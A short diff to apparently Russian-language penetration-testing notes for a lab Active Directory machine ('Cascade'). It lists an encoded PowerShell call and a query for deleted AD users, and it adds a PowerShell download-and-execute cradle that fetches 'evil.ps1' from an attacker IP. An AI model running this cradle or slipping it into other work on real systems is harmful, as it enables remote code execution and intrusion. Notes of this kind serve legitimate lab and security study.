@@ -26,3 +26,7 @@ powershell -enc (вывод)
 # Восстаовление корзины
 
 Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *
+
+# Загрузка скрипта
+
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')
